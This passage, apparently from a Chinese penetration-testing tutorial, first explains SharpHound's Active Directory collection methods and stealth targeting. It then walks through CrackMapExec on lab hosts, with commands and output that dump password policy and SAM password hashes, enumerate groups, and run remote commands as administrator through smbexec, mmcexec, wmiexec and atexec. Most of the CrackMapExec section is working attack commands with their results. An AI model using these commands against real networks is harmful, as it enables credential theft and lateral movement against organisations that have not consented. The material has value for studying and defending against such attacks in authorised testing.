<p>信任收集使用DsEnumerateDomainTrusts NETAPI32 API调用执行。运行此查询的示例：</p>
<pre><code class="prism language-c"><span class="token function">DsEnumerateDomainTrusts</span><span class="token punctuation">(</span><span class="token string">"testlab.local"</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> out IntPtr ptr<span class="token punctuation">,</span> out <span class="token keyword">int</span> domainCount<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>第二个参数是一组标志，用于指定要返回的信任类型。63对应于所有可能的标志：</p>
<pre><code class="prism language-c"><span class="token operator">-</span> DS_DOMAIN_IN_FOREST

<span class="token operator">-</span> DS_DOMAIN_DIRECT_OUTBOUND

<span class="token operator">-</span> DS_DOMAIN_TREE_ROOT

<span class="token operator">-</span> DS_DOMAIN_PRIMARY

<span class="token operator">-</span> DS_DOMAIN_NATIVE_MODE

<span class="token operator">-</span> DS_DOMAIN_DIRECT_INBOUND
</code></pre>
<p>这将返回所有可能的域类型</p>
<p><strong>对象属性</strong></p>
<p>所有属性集合都通过LDAP完成。SharpHound将向域控制器询问域中每个用户和计算机对象的列表，并为每个对象请求几个不同的属性。</p>
<p>对于用户对象，使用以下属性：</p>
<pre><code class="prism language-c">SamAccountName

DistinguishedName

SaMAccountType

PwdLastSet

LastLogon

SidHistory

UserAccountControl

Mail

ObjectSid

ServicePrincipalName

DisplayName
</code></pre>
<p>对于计算机对象，使用以下属性：</p>
<pre><code class="prism language-c">SaMAccountName

DistinguishedName

SaMAccountType

ObjectSid

UserAccountControl

DNSHostName

OperatingSystemServicePack

OperatingSystem
</code></pre>
<h2><a id="_2889"></a>每种收集方法的目标是什么系统？</h2>
<p>SharpHound根据提供的标记显着改变目标选择。SharpHound使用的默认收集方法非常粗暴，触及可到达的域上的每个系统。使用隐形标志可显着降低目标系统的数量。</p>
<p><strong>本地管理员 - 非隐秘</strong></p>
<p>没有隐秘标志的本地管理员集合将覆盖每个可到达的域计算机以收集数据。这提供了可靠和准确的结果。</p>
<p><strong>本地管理员 - 隐秘</strong></p>
<p>具有隐秘标志的本地管理员集合完全依赖于组策略设置，并且不需要触摸除SYSVOL文件夹中包含相关文件的域控制器之外的任何系统。隐秘收集返回的数据质量因域而异，因为某些域不使用GPO来管理本地管理员设置，而其他域则仅使用它。GPO不会反映所做的本地更改，因此使用此方法将无法找到添加到本地管理员组的其他原则。</p>
<p><strong>会话 - 非隐秘</strong></p>
<p>没有隐秘标志的会话集合将覆盖每个可到达的域计算机以收集数据。</p>
<p><strong>会话 - 隐秘</strong></p>
<p>具有隐秘标志的会话集合极大地限制了用于收集的系统的数量。SharpHound将使用LDAP中的UserAccountControl属性将所有标记为域控制器的计算机作为目标。还将请求具有任何HomeDirectory，ScriptPath或ProfilePath属性集的所有Active Directory对象的列表。从这些属性创建一组唯一的服务器名称，以标识会话收集的其他目标。平均而言，隐形会话收集将收集域中约50-60％的会话信息。这可能会因域的结构而异，但大多数网络会话通常指向域控制器或文件服务器。</p>
<p><strong>组- 隐秘与非隐秘</strong></p>
<p>组集合仅需要与域控制器通信以请求LDAP数据。</p>
<p><strong>ACL - 隐秘和非隐秘</strong></p>
<p>ACL集合仅需要与域控制器通信以请求LDAP数据。</p>
<p><strong>信任关系 - 隐秘和非隐秘</strong></p>
<p>信任收集需要与映射的每个域中的一个域控制器进行通信。</p>
<p><strong>对象属性 - 隐秘和非隐秘</strong></p>
<p>对象属性集合需要与域控制器通信以请求LDAP数据。</p>
<h2><a id="_2933"></a>技术总结</h2>
<p><strong>Cheat Sheets</strong><br>
<img src="https://img-blog.csdnimg.cn/20201008215143432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="103_Windows10Kali_2939"></a>10.3 Windows10配置搭建Kali环境</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>zhihuifly<span class="token punctuation">.</span>com<span class="token operator">/</span>t<span class="token operator">/</span>topic<span class="token operator">/</span><span class="token number">2731</span>
</code></pre>
<p>这个方法很多…不详细讲解了</p>
<hr>
<h2><a id="104_CrackMapExec_2947"></a>10.4 与CrackMapExec结合攻击</h2>
<p>CrackMapExec弥补了MSF4下auxiliary，scanner模块下的Command执行方式，但MSF5已解决该问题。在MSF4下，该框架针对后渗透的横向移动经常出现，虽然MSF5已解决该问题，但该框架在配合bloodhound与empire依然目前有一定优势。</p>
<p>安装方式：from Wiki：</p>
<h2><a id="Kali__2952"></a>Kali 安装</h2>
<pre><code class="prism language-c">apt‐get install crackmapexec
</code></pre>
<p>但作者推荐pipenv安装：</p>
<pre><code class="prism language-c">apt‐get install ‐y libssl‐dev libffi‐dev python‐dev build‐essential
pip install ‐‐user pipenv
git clone ‐‐recursive https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>byt3bl33d3r<span class="token operator">/</span>CrackMapExec
cd CrackMapExec <span class="token operator">&amp;&amp;</span> pipenv install
pipenv shell
python setup<span class="token punctuation">.</span>py install
</code></pre>
<h2><a id="Mac_OSX__2969"></a>Mac OSX 安装</h2>
<pre><code class="prism language-c">pip install ‐‐user crackmapexec
</code></pre>
<p>默认为100线程</p>
<pre><code class="prism language-c">cme smb <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> <span class="token number">445</span> JOHN‐PC <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Windows <span class="token number">7</span> Ultimate <span class="token number">7601</span> Service Pack <span class="token number">1</span>
x64 <span class="token punctuation">(</span>name<span class="token punctuation">:</span>JOHN‐PC<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain<span class="token punctuation">:</span>JOHN‐PC<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing<span class="token punctuation">:</span>False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1<span class="token punctuation">:</span>True<span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Windows Server <span class="token number">2003</span> R2 <span class="token number">3790</span> Service
Pack <span class="token number">2</span> x32 <span class="token punctuation">(</span>name<span class="token punctuation">:</span>WIN03X64<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain<span class="token punctuation">:</span>WIN03X64<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing<span class="token punctuation">:</span>False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1<span class="token punctuation">:</span>True<span class="token punctuation">)</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220019274.png#pic_center" alt="在这里插入图片描述"><br>
密码策略</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># cme smb <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> ‐u administrator ‐p <span class="token string">'123456'</span> ‐‐pass ‐pol
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Windows Server <span class="token number">2003</span> R2 <span class="token number">3790</span> Service
Pack <span class="token number">2</span> x32 <span class="token punctuation">(</span>name<span class="token punctuation">:</span>WIN03X64<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain<span class="token punctuation">:</span>WIN03X64<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing<span class="token punctuation">:</span>False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1<span class="token punctuation">:</span>True<span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> WIN03X64\administrator<span class="token punctuation">:</span><span class="token number">123456</span> <span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Dumping password info <span class="token keyword">for</span> domain<span class="token punctuation">:</span> WIN03X64
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Minimum password length<span class="token punctuation">:</span> None
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Password history length<span class="token punctuation">:</span> None
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Maximum password age<span class="token punctuation">:</span> <span class="token number">42</span> days <span class="token number">22</span> hours <span class="token number">47</span> minutes
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Password Complexity Flags<span class="token punctuation">:</span> <span class="token number">000000</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Domain Refuse Password Change<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Domain Password Store Cleartext<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Domain Password Lockout Admins<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Domain Password No Clear Change<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Domain Password No Anon Change<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Domain Password Complex<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Minimum password age<span class="token punctuation">:</span> None
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Reset Account Lockout Counter<span class="token punctuation">:</span> <span class="token number">30</span> minutes
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Locked Account Duration<span class="token punctuation">:</span> <span class="token number">30</span> minutes
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Account Lockout Threshold<span class="token punctuation">:</span> None
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Forced Log off Time<span class="token punctuation">:</span> Not Set
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220036542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
list hash</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># cme smb <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> ‐u administrator ‐p <span class="token string">'123456'</span> ‐‐sam
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Windows Server <span class="token number">2003</span> R2 <span class="token number">3790</span> Service
Pack <span class="token number">2</span> x32 <span class="token punctuation">(</span>name<span class="token punctuation">:</span>WIN03X64<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain<span class="token punctuation">:</span>WIN03X64<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing<span class="token punctuation">:</span>False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1<span class="token punctuation">:</span>True<span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> WIN03X64\administrator<span class="token punctuation">:</span><span class="token number">123456</span> <span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Dumping SAM hashes
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Administrator<span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">:</span><span class="token number">44</span>efce164ab921caaad3b435b51404ee<span class="token punctuation">:</span><span class="token number">32</span>ed87bdb5fdc5e9cba88547376818d4<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Guest<span class="token punctuation">:</span><span class="token number">501</span><span class="token punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="token punctuation">:</span><span class="token number">67f</span><span class="token number">33</span>d2095bda39fbf6b63fbadf2313a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 SUPPORT_388945a0<span class="token punctuation">:</span><span class="token number">1001</span><span class="token punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="token punctuation">:</span>f4d13c67c7608094c9b0e39147f07520<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 IUSR_WIN03X64<span class="token punctuation">:</span><span class="token number">1003</span><span class="token punctuation">:</span>dbec20afefb6cc332311fb9822ba61ce<span class="token punctuation">:</span><span class="token number">68</span>c22a11c400d91fa4f66ff36b3c15dc<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 IWAM_WIN03X64<span class="token punctuation">:</span><span class="token number">1004</span><span class="token punctuation">:</span>ff783381e4e022de176c59bf598409c7<span class="token punctuation">:</span><span class="token number">7e456</span>daac229ddceccf5f367aa69a487<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 ASPNET<span class="token punctuation">:</span><span class="token number">1008</span><span class="token punctuation">:</span>cc26551b70faffc095feb73db16b65ff<span class="token punctuation">:</span>fec6e9e4a08319a1f62cd30447247f88<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Added <span class="token number">6</span> SAM hashes to the database
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220056651.png#pic_center" alt="在这里插入图片描述"><br>
枚举组</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># cme smb <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> ‐u administrator ‐p <span class="token string">'123456'</span> ‐‐local‐groups
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 <span class="token punctuation">[</span>\<span class="token operator">*</span><span class="token punctuation">]</span> Windows Server <span class="token number">2003</span> R2 <span class="token number">3790</span> Service
Pack <span class="token number">2</span> x32 <span class="token punctuation">(</span>name<span class="token punctuation">:</span>WIN03X64<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain<span class="token punctuation">:</span>WIN03X64<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing<span class="token punctuation">:</span>False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1<span class="token punctuation">:</span>True<span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> WIN03X64\administrator<span class="token punctuation">:</span><span class="token number">123456</span> <span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Enumerated local groups
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 HelpServicesGroup membercount<span class="token punctuation">:</span> <span class="token number">1</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 IIS_WPG membercount<span class="token punctuation">:</span> <span class="token number">4</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 TelnetClients membercount<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Administrators membercount<span class="token punctuation">:</span> <span class="token number">1</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Backup Operators membercount<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Distributed COM Users membercount<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Guests membercount<span class="token punctuation">:</span> <span class="token number">2</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Network Configuration Operators membercount<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Performance Log Users membercount<span class="token punctuation">:</span> <span class="token number">1</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Performance Monitor Users membercount<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Power Users membercount<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Print Operators membercount<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Remote Desktop Users membercount<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Replicator membercount<span class="token punctuation">:</span> <span class="token number">0</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token number">445</span> WIN03X64 Users membercount<span class="token punctuation">:</span> <span class="token number">3</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220124623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
分别支持4种执行Command，如无–exec-method执行，默认为wmiexec执行。</p>
<pre><code class="prism language-c">mmcexec   
smbexec   
wmiexec   
atexec  
</code></pre>
<p>基于smbexec执行Command</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># cme smb <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> ‐u administrator ‐p <span class="token string">'123456'</span> ‐‐exec‐method smbexec ‐x <span class="token string">'net user'</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Windows Web Server <span class="token number">2008</span> R2 <span class="token number">760</span>
<span class="token number">0</span> x64 <span class="token punctuation">(</span>name<span class="token punctuation">:</span>WIN‐<span class="token number">5</span>BMI9HGC42S<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain<span class="token punctuation">:</span>WIN‐<span class="token number">5</span>BMI9HGC42S<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing<span class="token punctuation">:</span>False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1<span class="token punctuation">:</span>True<span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> WIN‐
<span class="token number">5</span>BMI9HGC42S\administrator<span class="token punctuation">:</span><span class="token number">123456</span> <span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Executed command via smbexec
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S \\ ���û��ʻ�
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S Administrator Guest
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S ����������ϣ�������һ����������
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220147421.png#pic_center" alt="在这里插入图片描述"><br>
基于dcom执行Command</p>
<pre><code class="prism language-c">root\@John<span class="token punctuation">:</span>\<span class="token operator">~</span>\# cme smb <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> ‐u administrator ‐p <span class="token string">'123456'</span> ‐‐exec‐method mmcexec ‐x <span class="token string">'whoami'</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Windows Web Server <span class="token number">2008</span> R2 <span class="token number">760</span>
<span class="token number">0</span> x64 <span class="token punctuation">(</span>name<span class="token punctuation">:</span>WIN‐<span class="token number">5</span>BMI9HGC42S<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain<span class="token punctuation">:</span>WIN‐<span class="token number">5</span>BMI9HGC42S<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing<span class="token punctuation">:</span>False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1<span class="token punctuation">:</span>True<span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> WIN‐
<span class="token number">5</span>BMI9HGC42S\administrator<span class="token punctuation">:</span><span class="token number">123456</span> <span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Executed command via mmcexec
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S win‐<span class="token number">5</span>bmi9hgc42s\administrator
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220241284.png#pic_center" alt="在这里插入图片描述"><br>
基于wmi执行Command</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># cme smb <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> ‐u administrator ‐p <span class="token string">'123456'</span> ‐‐exec‐method wmiexec ‐x <span class="token string">'whoami'</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Windows Web Server <span class="token number">2008</span> R2 <span class="token number">760</span>
<span class="token number">0</span> x64 <span class="token punctuation">(</span>name<span class="token punctuation">:</span>WIN‐<span class="token number">5</span>BMI9HGC42S<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain<span class="token punctuation">:</span>WIN‐<span class="token number">5</span>BMI9HGC42S<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing<span class="token punctuation">:</span>False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1<span class="token punctuation">:</span>True<span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> WIN‐
<span class="token number">5</span>BMI9HGC42S\\administrator<span class="token punctuation">:</span><span class="token number">123456</span> <span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Executed command via wmiexec
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S win‐<span class="token number">5</span>bmi9hgc42s\administrator
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008220256240.png#pic_center" alt="在这里插入图片描述"><br>
基于AT执行Command</p>
<p>目标机：无运行calc进程<br>
<img src="https://img-blog.csdnimg.cn/20201008220314107.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># cme smb <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> ‐u administrator ‐p <span class="token string">'123456'</span> ‐‐exec‐method atexec ‐x <span class="token string">'calc'</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Windows Web Server <span class="token number">2008</span> R2 <span class="token number">760</span>
<span class="token number">0</span> x64 <span class="token punctuation">(</span>name<span class="token punctuation">:</span>WIN‐<span class="token number">5</span>BMI9HGC42S<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain<span class="token punctuation">:</span>WIN‐<span class="token number">5</span>BMI9HGC42S<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing<span class="token punctuation">:</span>False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1<span class="token punctuation">:</span>True<span class="token punctuation">)</span>
SMB <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span> <span class="token number">445</span> WIN‐<span class="token number">5</span>BMI9HGC42S <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> WIN‐
<span class="token number">5</span>BMI9HGC42S\administrator<span class="token punctuation">:</span><span class="token number">123456</span> <span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>
